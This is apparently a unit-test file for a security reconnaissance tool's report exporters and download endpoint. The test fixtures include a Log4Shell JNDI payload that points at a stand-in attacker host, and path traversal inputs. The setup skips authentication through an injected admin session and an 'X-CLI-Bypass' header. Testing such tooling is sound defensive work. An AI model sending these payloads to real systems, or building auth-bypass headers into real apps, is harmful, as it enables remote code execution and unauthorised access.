import os
import sys
import unittest
import json
from urllib.parse import urlparse

# Ensure workspace root is in path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from exports.burp_exporter import generate_burp_export
from exports.markdown_exporter import generate_markdown_report
from exports.json_exporter import generate_json_export
from pipeline.pipeline_controller import run_export_pipeline, classify_and_segregate_findings
from app import app

class TestExporters(unittest.TestCase):
    def setUp(self):
        # Web exploit findings
        self.web_exploits = [
            {
                "finding_type": "web_exploit",
                "cve_id": "CVE-2021-44228",
                "title": "Log4j Remote Code Execution",
                "severity": "CRITICAL",
                "cvss_score": 10.0,
                "host": "vulnerable.target.local",
                "endpoint": "/log4j",
                "url": "http://vulnerable.target.local/log4j",
                "service_name": "Apache Log4j",
                "description": "HTTP exploit: Apache Log4j2 JNDI features do not protect against attacker controlled LDAP endpoints.",
                "validation_status": "Exploitable",
                "method": "POST",
                "headers": {
                    "Host": "vulnerable.target.local",
                    "User-Agent": "Mozilla/5.0",
                    "X-Api-Version": "${jndi:ldap://attacker.com/a}"
                },
                "body": "payload=test"
            },
            {
                "finding_type": "web_exploit",
                "cve_id": "CVE-2020-0001",
                "title": "SQL Injection in User Search",
                "severity": "HIGH",
                "cvss_score": 8.8,
                "host": "vulnerable.target.local",
                "endpoint": "/search.php",
                "url": "http://vulnerable.target.local/search.php?q=1",
                "service_name": "User Lookup API",
                "description": "SQL Injection vulnerability exists in the query parameter.",
                "validation_status": "Exploitable",
                "method": "GET",
                "headers": {
                    "Host": "vulnerable.target.local",
                    "User-Agent": "Mozilla/5.0"
                }
            }
        ]

        # Technology CVE findings
        self.tech_cves = [
            {
                "finding_type": "technology_cve",
                "cve_id": "CVE-2023-1234",
                "title": "Outdated jQuery stack",
                "severity": "LOW",
                "cvss_score": 3.0,
                "host": "vulnerable.target.local",
                "endpoint": "/js/jquery.js",
                "url": "http://vulnerable.target.local/js/jquery.js",
                "service_name": "jQuery",
                "description": "Generic Outdated software library vulnerability.",
                "validation_status": "Unverified"
            }
        ]

        # Traffic anomaly findings
        self.traffic_anomalies = [
            {
                "finding_type": "traffic_anomaly",
                "target": "vulnerable.target.local",
                "host": "anomaly.target.local",
                "packet_count": 150,
                "syn_count": 50,
                "ip_count": 5,
                "anomaly_score": -0.05,
                "classification": "suspicious",
                "explanation": "Classification as 'suspicious' is mathematically driven by an Isolation Forest decision score of -0.05. Feature parameters analyzed: packet_count=150, tcp_syn_count=50, unique_ips=5."
            }
        ]

        self.target = "vulnerable.target.local"
        self.scan_id = "test_scan_12345"

        # Configure Flask test client
        self.client = app.test_client()
        app.config['TESTING'] = True
        
        # Enable dev mode in environment so lab mode bypass allows CLI header validation
        os.environ["DEV_MODE"] = "true"
        
        # Inject login session directly to bypass enforce_strict_auth
        with self.client.session_transaction() as sess:
            sess["user_id"] = "test_user_id"
            sess["role"] = "admin"
            sess["username"] = "admin"

    def test_burp_exporter_only_with_captured_headers(self):
        """
        Test that Burp Suite exporter correctly includes replayable HTTP findings with authentic headers.
        """
        filename = generate_burp_export(self.web_exploits, self.target)
        self.assertIsNotNone(filename)
        self.assertTrue(filename.startswith("burp_requests_"))
        
        # Read file contents
        reports_dir = os.path.join(os.getcwd(), "reports")
        file_path = os.path.join(reports_dir, filename)
        self.assertTrue(os.path.exists(file_path))
        
        with open(file_path, "r", encoding="utf-8") as f:
            content = f.read()

        # Should contain the Log4j LDAP payload headers
        self.assertIn("X-Api-Version: ${jndi:ldap://attacker.com/a}", content)
        # Should contain the SQL Injection GET request
        self.assertIn("GET /search.php?q=1 HTTP/1.1", content)

        # Cleanup
        if os.path.exists(file_path):
            os.remove(file_path)

    def test_burp_exporter_no_headers_excluded(self):
        """
        Test that Burp Suite exporter excludes findings without authentic request headers and returns None if none exist.
        """
        no_header_findings = [
            {
                "cve_id": "CVE-2020-0001",
                "title": "SQL Injection in User Search",
                "severity": "HIGH",
                "cvss_score": 8.8,
                "host": "vulnerable.target.local",
                "endpoint": "/search.php",
                "url": "http://vulnerable.target.local/search.php?q=1",
                "service_name": "User Lookup API",
                "description": "SQL Injection vulnerability exists in the query parameter.",
                "validation_status": "Exploitable",
                "method": "GET"
                # headers is missing or empty
            }
        ]
        filename = generate_burp_export(no_header_findings, self.target)
        self.assertIsNone(filename)

    def test_markdown_report_structure(self):
        """
        Test that HackerOne-style Markdown vulnerability report has correct structure,
        three distinct sections, and no synthesized fake requests or exploit language in non-exploit sections.
        """
        filename = generate_markdown_report(self.web_exploits, self.tech_cves, self.traffic_anomalies, self.target)
        self.assertIsNotNone(filename)
        self.assertTrue(filename.startswith("reconx_report_"))

        reports_dir = os.path.join(os.getcwd(), "reports")
        file_path = os.path.join(reports_dir, filename)
        self.assertTrue(os.path.exists(file_path))

        with open(file_path, "r", encoding="utf-8") as f:
            content = f.read()

        self.assertIn("# ReconX Security Assessment Report", content)
        self.assertIn("## Executive Summary", content)
        
        # Verify 3 distinct sections
        self.assertIn("## 1. Web Exploit Findings", content)
        self.assertIn("## 2. Technology CVE Findings", content)
        self.assertIn("## 3. Traffic Anomaly Findings", content)

        # Web exploit details should exist
        self.assertIn("CVE-2021-44228", content)
        # Tech CVE details should exist
        self.assertIn("CVE-2023-1234", content)
        # Traffic anomaly details should exist with mathematical justification
        self.assertIn("anomaly.target.local", content)
        self.assertIn("mathematically driven", content)

        # Cleanup
        if os.path.exists(file_path):
            os.remove(file_path)

    def test_json_export_serialization(self):
        """
        Test that structured JSON export conforms to expected keys and separates findings into three distinct arrays.
        """
        filename = generate_json_export(self.web_exploits, self.tech_cves, self.traffic_anomalies, self.target)
        self.assertIsNotNone(filename)
        self.assertTrue(filename.startswith("reconx_export_"))

        reports_dir = os.path.join(os.getcwd(), "reports")
        file_path = os.path.join(reports_dir, filename)
        self.assertTrue(os.path.exists(file_path))

        with open(file_path, "r", encoding="utf-8") as f:
            data = json.load(f)

        self.assertEqual(data["target"], self.target)
        self.assertEqual(data["tool"], "ReconX")
        
        self.assertIn("summary", data)
        self.assertEqual(data["summary"]["total_findings"], 4)
        self.assertEqual(data["summary"]["web_exploit_count"], 2)
        self.assertEqual(data["summary"]["technology_cve_count"], 1)
        self.assertEqual(data["summary"]["traffic_anomaly_count"], 1)

        self.assertIn("web_exploit_findings", data)
        self.assertIn("technology_cve_findings", data)
        self.assertIn("traffic_anomaly_findings", data)

        self.assertEqual(len(data["web_exploit_findings"]), 2)
        self.assertEqual(len(data["technology_cve_findings"]), 1)
        self.assertEqual(len(data["traffic_anomaly_findings"]), 1)

        # Cleanup
        if os.path.exists(file_path):
            os.remove(file_path)

    def test_pipeline_normalisation_and_routing(self):
        """
        Test that classify_and_segregate_findings correctly routes finding inputs.
        """
        input_data = {
            "technology_fingerprints": [
                {
                    "url": "http://vulnerable.target.local/log4j",
                    "subdomain": "vulnerable.target.local",
                    "technologies": [
                        {
                            "technology": "Apache Log4j",
                            "version": "2.14.1",
                            "cves": [
                                {
                                    "cve": "CVE-2021-44228",
                                    "cvss": 10.0,
                                    "severity": "CRITICAL",
                                    "validation_status": "Exploitable"
                                }
                            ]
                        }
                    ]
                }
            ],
            "model6": [
                {
                    "cve_id": "CVE-2021-44228",
                    "title": "Log4j Remote Code Execution",
                    "description": "remote code execution",
                    "service": "Apache Log4j",
                    "port": 80,
                    "cvss": 10.0,
                    "risk_level": "CRITICAL",
                    "headers": {
                        "Host": "vulnerable.target.local",
                        "User-Agent": "Mozilla/5.0",
                        "X-Api-Version": "${jndi:ldap://attacker.com/a}"
                    },
                    "method": "POST"
                }
            ],
            "http_anomalies": [
                {
                    "subdomain": "anomaly.target.local",
                    "model4_result": {
                        "status": "suspicious",
                        "anomaly_score": -0.05,
                        "justification": "mathematically driven Isolation Forest score",
                        "traffic_data": {
                            "packet_count": 150,
                            "tcp_syn_count": 50,
                            "unique_ips": 5
                        }
                    }
                }
            ]
        }

        web_exploits, tech_cves, traffic_anomalies = classify_and_segregate_findings(input_data, self.target)
        
        # Log4j has headers in model6, should be classified as web_exploit
        self.assertEqual(len(web_exploits), 1)
        self.assertEqual(web_exploits[0]["cve_id"], "CVE-2021-44228")

        # No other CVEs exist in tech fingerprints that are not log4j, so tech_cves should be empty
        self.assertEqual(len(tech_cves), 0)

        # Anomaly should be routed properly
        self.assertEqual(len(traffic_anomalies), 1)
        self.assertEqual(traffic_anomalies[0]["host"], "anomaly.target.local")

    def test_flask_path_traversal_protection(self):
        """
        Test that the download endpoint rejects path traversal attempts.
        """
        reports_dir = os.path.join(os.getcwd(), "reports")
        os.makedirs(reports_dir, exist_ok=True)
        test_file = "reconx_export_test_traversal.json"
        test_path = os.path.join(reports_dir, test_file)
        
        with open(test_path, "w") as f:
            f.write('{"test": "ok"}')

        try:
            # 1. Valid download request should return 200 using the X-CLI-Bypass header
            headers = {"X-CLI-Bypass": "reconx_cli_mode"}
            with self.client.get(f'/download/{test_file}', headers=headers) as resp:
                self.assertEqual(resp.status_code, 200)

            # 2. Direct traversal in URL should get rejected with 400
            with self.client.get('/download/../../app.py', headers=headers) as resp:
                self.assertEqual(resp.status_code, 400)
                data = json.loads(resp.data.decode('utf-8'))
                self.assertIn("Path traversal attempt blocked", data["error"])

            # 3. Path separators rejection
            with self.client.get('/download/subdir/app.py', headers=headers) as resp:
                self.assertEqual(resp.status_code, 400)

        finally:
            if os.path.exists(test_path):
                os.remove(test_path)

    def test_mongo_retry_wrapper(self):
        """
        Test that RetryCollectionWrapper retries on transient errors and succeeds if recovery occurs.
        """
        from config.database import RetryCollectionWrapper
        from pymongo.errors import AutoReconnect

        class MockCollection:
            def __init__(self):
                self.calls = 0

            def insert_one(self, doc):
                self.calls += 1
                if self.calls < 3:
                    raise AutoReconnect("Connection lost, electing new primary")
                return {"inserted_id": 1}

        wrapped = RetryCollectionWrapper(MockCollection())
        result = wrapped.insert_one({"test": "data"})
        self.assertEqual(result, {"inserted_id": 1})
        self.assertEqual(wrapped._collection.calls, 3)

    @classmethod
    def tearDownClass(cls):
        from config.database import client
        if client:
            client.close()

if __name__ == "__main__":
    unittest.main()
